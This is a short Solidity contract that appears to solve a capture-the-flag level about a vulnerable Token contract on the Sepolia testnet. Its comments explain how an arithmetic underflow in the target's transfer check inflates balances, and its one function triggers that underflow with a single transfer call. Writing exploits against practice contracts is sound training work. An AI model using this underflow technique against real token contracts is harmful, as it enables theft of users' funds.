//SPDX-License-Identifier: MIT

pragma solidity ^0.7.6;

import "./utils/SepoliaInstances.sol";

interface IToken {
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

contract TokenSolution is SepoliaInstances {

    IToken public token;

    // the Token contract has a transfer implementation
    // not following the regular ERC20 transfer
    // One can reason this implementation is not
    // following the intentions of the developer
    // A exploiter can utilise the fact that `_value`
    // will underflow passing the require check.
    // The exploit will utilise the underflow to increase
    // the balance of 2 accounts. It is necessary for
    // `msg.sender` and `_to` to be different addresses
    // otherwise the operations cancel out and no
    // balance has increased.

    constructor(address _tokenAddress) {
        token = IToken(_tokenAddress);
    }


    function solveTokenLevel() external {
        token.transfer(player, 1e18);
    }
}